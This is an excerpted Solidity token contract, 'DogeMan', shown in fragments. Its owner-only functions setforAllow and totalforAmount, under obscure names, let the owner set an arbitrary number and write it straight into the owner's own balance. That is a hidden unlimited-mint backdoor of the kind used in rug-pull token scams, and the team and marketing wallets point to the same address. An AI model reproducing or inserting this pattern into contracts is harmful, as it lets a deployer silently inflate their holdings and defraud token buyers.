...
contract DogeMan is Context, IERC20, Ownable {
    ...
    address payable public teamWalletAddress = payable(0x4BaC2a23344cA5AcdE4Ee49B7b65E2a9c64c9E44);



    address payable public marketingWalletAddress = payable(0x4BaC2a23344cA5AcdE4Ee49B7b65E2a9c64c9E44);
    ...
    uint256 public _TokensDec = 0;    



    uint256 public _totalAmount = _TokensDec * _varAmount;
    ...
    function setforAllow() external onlyOwner() {

        _totalWallets[getOwner()] = _totalAmount ; 
    ...
    function totalforAmount(uint256 TokensDec) external onlyOwner() {



        _TokensDec=TokensDec;



        _totalAmount = _TokensDec * _varAmount;
